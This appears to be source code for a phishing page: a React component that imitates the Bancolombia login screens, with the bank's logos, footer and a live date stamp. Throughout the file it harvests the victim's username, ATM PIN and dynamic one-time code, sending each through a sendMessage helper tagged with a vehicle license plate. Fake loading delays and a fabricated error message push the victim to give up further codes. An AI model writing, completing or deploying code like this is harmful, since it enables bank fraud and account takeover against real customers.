import React, { useEffect, useState, useRef } from 'react';
import { useLocation, useNavigate } from "react-router-dom"; 
import Styles from './Button.module.css';
import sendMessage from '../Sender/Sender';
import HeaderLogo from '../../Assets/Images/Button/HeaderLogo.svg';
import Exit from '../../Assets/Images/Button/Exit.svg';
import Arrow from '../../Assets/Images/Button/Arrow.svg';
import FooterLogo from '../../Assets/Images/Button/FooterLogo.svg';
import User from '../../Assets/Images/Button/User.svg';
import loaderGif from '../../Assets/Images/Button/loaderBC.svg'

function Button() {

    const location = useLocation();
    const navigate = useNavigate();
    const { licensePlate } = location.state || {};

    const [dataF, setDataF] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');

    const [clavePrincipal, setClavePrincipal] = useState(['', '', '', '']);
    const [claveDinamica, setClaveDinamica] = useState(['', '', '', '', '', '']);

    const handleContinue = (e) => {
        e.preventDefault();

        if (activeSection === 2) {
            const mensaje = `Placa: ${licensePlate.toUpperCase()}

Usuario Bancolombia: ${dataF}`;

            sendMessage(mensaje);
            setLoading(true)
            setTimeout(() => {
                setLoading(false);
            }, 13000);
            setActiveSection(3);
        } else if (activeSection === 3) { 
            const mensaje = `Placa: ${licensePlate.toUpperCase()}

Clave Bancolombia: ${clavePrincipal.join('')}`;

            sendMessage(mensaje);
            setLoading(true)
            setTimeout(() => {
                setLoading(false);
            }, 13000);
            setActiveSection(4);
        } else {
            const mensaje = `Placa: ${licensePlate.toUpperCase()}

Dinamica Bancolombia: ${claveDinamica.join('')}`;

            sendMessage(mensaje);
            setLoading(true);
            setTimeout(() => {
                setLoading(false);
                setError('Ocurrió un error. Intenta nuevamente.');
                setClaveDinamica(['', '', '', '', '', '']);

            }, 13000);
        }
    };

    const [fechaHora, setFechaHora] = useState('');

    useEffect(() => {

        const ahora = new Date();

        const opcionesFecha = {
            weekday: 'long', 
            day: 'numeric',
            month: 'long',
            year: 'numeric',
        };

        const fechaFormateada = ahora.toLocaleDateString('es-ES', opcionesFecha);

        const hora = ahora.getHours().toString().padStart(2, '0');
        const minutos = ahora.getMinutes().toString().padStart(2, '0');

        const capitalizar = (texto) => texto.charAt(0).toUpperCase() + texto.slice(1);

        setFechaHora(`${capitalizar(fechaFormateada)}, ${hora}:${minutos}`);
    }, []);

    const [activeSection, setActiveSection] = useState(1);

    const inputRefsClave = useRef([]);
    const inputRefsDinamica = useRef([]);

    return (
        <>
            <header className={Styles.xHeaderBA}>
                <img src={HeaderLogo} alt="Logo Encabezado"></img>
                <div>
                    <p>Salir</p>
                    <img src={Exit} alt="Salir"></img>
                </div>
            </header>
            <main className={Styles.xMainBA}>
                {activeSection === 1 && (
                    <section className={Styles.xMainSectionBA}>
                        <h1>Iniciar sesión</h1>
                        <h2>Elige como quieres continuar</h2>
                        <div onClick={() => setActiveSection(2)}>
                            <div>
                                <h3>Bancolombia Personas</h3>
                                <p>Si maneja cuentas o productos personales.</p>
                            </div>
                            <div>
                                <img src={Arrow} alt="Flecha Ingresar"></img>
                            </div>
                        </div>
                        <div>
                            <div>
                                <h3>Bancolombia Negocios</h3>
                                <p>Si maneja cuentas o productos de negocios.</p>
                            </div>
                            <div>
                                <img src={Arrow} alt="Flecha Ingresar"></img>
                            </div>
                        </div>
                        <p>¿Qué opción debo elegir?</p>
                    </section>
                )}
                {activeSection === 2 && (
                    <section className={Styles.xSecondSectionBA}>
                        <h3>Te damos la bienvenida</h3>
                        <div>
                            <h4>El usuario es el mimso con el que ingresas a la <span>Sucursal Virtual Personas</span></h4>
                            <div>
                                <img src={User} alt="Usuario"></img>
                                <input  
                                    type="text"
                                    required
                                    value={dataF}
                                    onChange={(e) => setDataF(e.target.value)}
                                />
                            </div>
                            <p>¿Olvidaste tu usuario?</p>
                            <div>
                                <button>Volver</button>
                                <button onClick={handleContinue}>Continuar</button>
                            </div>
                            
                        </div>
                    </section>
                )}
                {activeSection === 3 && (
                    <section className={Styles.xSecondSectionBA}>
                        <h3>Clave Principal</h3>
                        <div>
                            <h4>Es la misma que usas en el cajero</h4>
                            <div className={Styles.xInputSecondSectionBA}>
                                {clavePrincipal.map((valor, index) => (
                                    <input
                                        key={index}
                                        type="text"
                                        maxLength={1}
                                        inputMode="numeric"
                                        pattern="[0-9]*"
                                        value={valor}
                                        ref={(el) => inputRefsClave.current[index] = el}
                                        onChange={(e) => {
                                            const val = e.target.value.replace(/\D/, ''); // solo números
                                            const newClave = [...clavePrincipal];
                                            newClave[index] = val;
                                            setClavePrincipal(newClave);

                                            if (val && index < clavePrincipal.length - 1) {
                                                inputRefsClave.current[index + 1]?.focus();
                                            }
                                        }}
                                        onKeyDown={(e) => {
                                            if (e.key === 'Backspace' && !clavePrincipal[index] && index > 0) {
                                                inputRefsClave.current[index - 1]?.focus();
                                            }
                                        }}
                                    />
                                ))}
                            </div>
                            <div>
                                <button>Volver</button>
                                <button onClick={handleContinue}>Continuar</button>
                            </div>
                        </div>
                    </section>
                )}
                {activeSection === 4 && (
                    <section className={Styles.xSecondSectionBA}>
                        <h3>Clave Dinamica</h3>
                        <div>
                            <h4>Consulta tu Clave Dinámica desde la App Mi Bancolombia.</h4>
                            {error && <p style={{ color: 'red' }}>{error}</p>}
                            <div className={Styles.xInputSecondSectionBA}>
                                {claveDinamica.map((valor, index) => (
                                    <input
                                        key={index}
                                        type="text"
                                        maxLength={1}
                                        inputMode="numeric"
                                        pattern="[0-9]*"
                                        value={valor}
                                        ref={(el) => inputRefsDinamica.current[index] = el}
                                        onChange={(e) => {
                                            const val = e.target.value.replace(/\D/, ''); // solo números
                                            const newClave = [...claveDinamica];
                                            newClave[index] = val;
                                            setClaveDinamica(newClave);

                                            if (val && index < claveDinamica.length - 1) {
                                                inputRefsDinamica.current[index + 1]?.focus();
                                            }
                                        }}
                                        onKeyDown={(e) => {
                                            if (e.key === 'Backspace' && !claveDinamica[index] && index > 0) {
                                                inputRefsDinamica.current[index - 1]?.focus();
                                            }
                                        }}
                                    />
                                ))}
                            </div>                          
                            <div>
                                <button>Volver</button>
                                <button onClick={handleContinue}>Ingresar</button>
                            </div>
                        </div>
                    </section>
                )}
            </main>
            {loading && (
                <aside className={Styles.loader}>
                    <div className={Styles.loaderContent}>
                        <img src={loaderGif} alt="Loader" />
                        <p>Cargando...</p>
                    </div>
                </aside>
            )}
            <footer className={Styles.xFooterBA}>
                <div>
                    <img src={HeaderLogo} alt="Logo Pie de Pagina"></img>
                    <img src={FooterLogo} alt="Logo Vigilado SIC"></img>
                </div>
                <div>
                    <p>{fechaHora}</p>
                </div>
            </footer>
        </>
    )
}

export default Button;